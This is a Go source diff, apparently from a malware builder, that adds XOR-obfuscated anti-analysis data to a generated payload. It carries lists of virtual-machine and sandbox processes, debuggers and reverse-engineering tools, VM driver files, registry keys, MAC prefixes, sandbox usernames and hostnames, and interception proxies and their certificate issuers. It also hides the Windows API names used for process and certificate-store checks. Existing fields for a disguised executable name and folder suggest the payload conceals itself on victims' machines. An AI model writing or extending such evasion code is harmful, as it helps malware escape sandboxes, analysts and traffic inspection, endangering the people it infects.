@@ -126,6 +126,30 @@ type globalValues struct {
 	EncDisguisedExeName string
 	EncDisguiseDir      string
 	EncLocalAppDataEnv  string
+	EncVmProcesses      string
+	EncSandboxProcs     string
+	EncVmFiles          string
+	EncSandboxUsers     string
+	EncSandboxHosts     string
+	EncVmMacPrefixes    string
+	EncMitmProcs        string
+	EncMitmIssuers      string
+	EncVmRegPaths       string
+	EncGlobalMemoryStatusEx    string
+	EncGetDiskFreeSpaceExW     string
+	EncGetTickCount64          string
+	EncRegOpenKeyExW           string
+	EncRegCloseKey             string
+	EncGetSystemMetrics        string
+	EncCreateToolhelp32Snapshot string
+	EncProcess32FirstW         string
+	EncProcess32NextW          string
+	EncCrypt32Dll              string
+	EncCertOpenSystemStoreW    string
+	EncCertEnumCerts           string
+	EncCertGetNameStringW      string
+	EncCertFreeCertCtx         string
+	EncCertCloseStore          string
 	AntiAnalysisMode    string
 	OfflineMode         bool
 	XorKeyLiteral       string
@@ -292,6 +316,88 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncDisguisedExeName: xorWithKey(pickDisguiseName(), key),
 		EncDisguiseDir:      xorWithKey(pickDisguiseDir(), key),
 		EncLocalAppDataEnv:  xorWithKey("LOCALAPPDATA", key),
+		EncVmProcesses: xorListWithKey([]string{
+			"VBoxService.exe", "VBoxTray.exe", "vmtoolsd.exe", "VMwareTray.exe",
+			"VMwareUser.exe", "vmware.exe", "vmware-vmx.exe", "prl_tools.exe",
+			"prl_cc.exe", "qemu-ga.exe", "vmsrvc.exe", "vboxservice.exe",
+			"vboxtray.exe", "xenservice.exe", "joeboxcontrol.exe", "joeboxserver.exe",
+			"cuckoomon.exe", "cuckoo.exe", "prl_tools_service.exe", "vdagent.exe", "vdservice.exe", "windanr.exe",
+		}, key),
+		EncSandboxProcs: xorListWithKey([]string{
+			"SandboxieRpcSs.exe", "SandboxieDcomLaunch.exe", "SbieSvc.exe",
+			"procmon.exe", "procmon64.exe", "wireshark.exe", "fiddler.exe",
+			"ollydbg.exe", "idaq.exe", "idaq64.exe", "x64dbg.exe", "x32dbg.exe",
+			"windbg.exe", "dnSpy.exe", "de4dot.exe", "ilspy.exe",
+			"dotPeek32.exe", "dotPeek64.exe", "pestudio.exe", "processhacker.exe",
+			"autoruns.exe", "autorunsc.exe", "regmon.exe", "filemon.exe",
+			"tcpview.exe", "Rachael.exe", "DVTAP.exe", "analyzer.exe",
+		}, key),
+		EncVmFiles: xorListWithKey([]string{
+			`C:\Windows\System32\VBox*.dll`, `C:\Windows\System32\VBoxHook.dll`,
+			`C:\Windows\System32\VBoxGuest.sys`, `C:\Windows\System32\VBoxMouse.sys`,
+			`C:\Windows\System32\VBoxSF.sys`, `C:\Windows\System32\vmGuestLib.dll`,
+			`C:\Windows\System32\vm3dgl.dll`,
+			`C:\Program Files\VMware\VMware Tools\vmtoolsd.exe`,
+			`C:\Program Files\Oracle\VirtualBox\VBoxService.exe`,
+			`C:\Windows\System32\drivers\vmmouse.sys`, `C:\Windows\System32\drivers\vmhgfs.sys`,
+			`C:\Windows\System32\drivers\VBoxGuest.sys`, `C:\Windows\System32\drivers\VBoxMouse.sys`,
+			`C:\Windows\System32\drivers\VBoxSF.sys`, `C:\Windows\System32\drivers\VBoxVideo.sys`,
+		}, key),
+		EncSandboxUsers: xorListWithKey([]string{
+			"sandbox", "virus", "malware", "maltest", "test", "john", "user",
+			"currentuser", "sand box", "tester", "cuckoo", "vmware",
+			"vbox", "qemu", "analysis", "sample", "default", "infected", "pc",
+		}, key),
+		EncSandboxHosts: xorListWithKey([]string{
+			"sandbox", "malware", "virus", "analysis", "sample", "cuckoo", "testpc", "desktop-",
+		}, key),
+		EncVmMacPrefixes: xorListWithKey([]string{
+			"00:05:69", "00:0c:29", "00:1c:14", "00:50:56",
+			"08:00:27", "00:1c:42", "52:54:00", "00:16:3e",
+			"00:03:ff", "02:42:ac",
+		}, key),
+		EncMitmProcs: xorListWithKey([]string{
+			"Fiddler.exe", "FiddlerEverywhere.exe", "Charles.exe", "BurpSuite.exe",
+			"burp.exe", "mitmproxy.exe", "Proxifier.exe", "HTTPDebuggerUI.exe",
+			"HTTPDebuggerSvc.exe", "sslsplit.exe", "sslproxy.exe", "zap.exe",
+			"OWASPZAP.exe", "SmartSniff.exe", "HttpAnalyzerStd.exe", "RawCap.exe",
+			"NetworkMiner.exe", "GlassWire.exe", "Tcpdump.exe", "PacketCapture.exe", "NetworkMonitor.exe",
+		}, key),
+		EncMitmIssuers: xorListWithKey([]string{
+			"fiddler", "charles", "burp", "mitmproxy", "portswigger",
+			"owasp", "zap proxy", "do_not_trust", "insecure",
+		}, key),
+		EncVmRegPaths: xorListWithKey([]string{
+			"0x80000002|SOFTWARE\\VMware, Inc.\\VMware Tools",
+			"0x80000002|SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+			"0x80000001|SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxService",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\vmci",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\vmmouse",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VMTools",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VMMEMCTL",
+			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\Xen*",
+		}, key),
+		EncGlobalMemoryStatusEx:     xorWithKey("GlobalMemoryStatusEx", key),
+		EncGetDiskFreeSpaceExW:      xorWithKey("GetDiskFreeSpaceExW", key),
+		EncGetTickCount64:           xorWithKey("GetTickCount64", key),
+		EncRegOpenKeyExW:            xorWithKey("RegOpenKeyExW", key),
+		EncRegCloseKey:              xorWithKey("RegCloseKey", key),
+		EncGetSystemMetrics:         xorWithKey("GetSystemMetrics", key),
+		EncCreateToolhelp32Snapshot: xorWithKey("CreateToolhelp32Snapshot", key),
+		EncProcess32FirstW:          xorWithKey("Process32FirstW", key),
+		EncProcess32NextW:           xorWithKey("Process32NextW", key),
+		EncCrypt32Dll:               xorWithKey("crypt32.dll", key),
+		EncCertOpenSystemStoreW:     xorWithKey("CertOpenSystemStoreW", key),
+		EncCertEnumCerts:            xorWithKey("CertEnumCertificatesInStore", key),
+		EncCertGetNameStringW:       xorWithKey("CertGetNameStringW", key),
+		EncCertFreeCertCtx:          xorWithKey("CertFreeCertificateContext", key),
+		EncCertCloseStore:           xorWithKey("CertCloseStore", key),
 		AntiAnalysisMode:  strings.TrimSpace(cfg.AntiAnalysis),
 		OfflineMode:       cfg.OfflineMode,
 		XorKeyLiteral:     escapeGoString(key),
